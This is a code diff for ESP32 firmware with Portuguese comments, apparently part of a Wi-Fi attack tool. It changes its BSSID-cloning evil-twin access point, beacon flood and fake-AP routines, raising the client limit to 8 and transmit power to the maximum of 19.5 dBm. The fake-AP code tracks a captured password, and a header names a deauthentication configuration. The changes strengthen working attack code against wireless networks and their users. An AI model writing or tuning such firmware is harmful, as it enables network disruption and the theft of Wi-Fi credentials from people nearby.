@@ -3,6 +3,11 @@
 #include "config.h"
 
 // ============================================================
+// CONFIG DEAUTH v3.1+
+// TX Power: 19.5dBm (max legal ESP32)
+// Max Clients: 8 (dobro do padrao 4)
+// ============================================================
+// ============================================================
 // CONTADORES E ESTADO
 // ============================================================
 static uint32_t deauthPacketCount = 0;
@@ -123,7 +128,8 @@ static void startBssidClone(uint8_t networkIndex) {
     Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
     delay(200);
 
-    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 4);
+    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
+        WiFi.setTxPower(WIFI_POWER_19_5dBm);
     Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
 
     if (apOk) {
@@ -159,7 +165,8 @@ static void restartBssidClone() {
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     delay(200);
     
-    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 4);
+    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
+        WiFi.setTxPower(WIFI_POWER_19_5dBm);
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
         cloneHealthCheckFailures = 0;
@@ -223,7 +230,8 @@ static void beaconFloodStep() {
     esp_wifi_set_mac(WIFI_IF_AP, floodMacs[floodIndex]);
     delay(100);
     
-    WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 1);
+    WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
+    WiFi.setTxPower(WIFI_POWER_19_5dBm);
     delay(100);
     
     floodIndex = (floodIndex + 1) % 5;
@@ -329,7 +337,8 @@ bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }
 // ============================================================
 void startFakeAP(const char* ssid) {
     WiFi.mode(WIFI_AP);
-    WiFi.softAP(ssid, "12345678");
+    WiFi.softAP(ssid, "12345678", 1, 0, 8);
+    WiFi.setTxPower(WIFI_POWER_19_5dBm);
     fakeAPEnabled = true;
     passwordCaptured = false;
 }
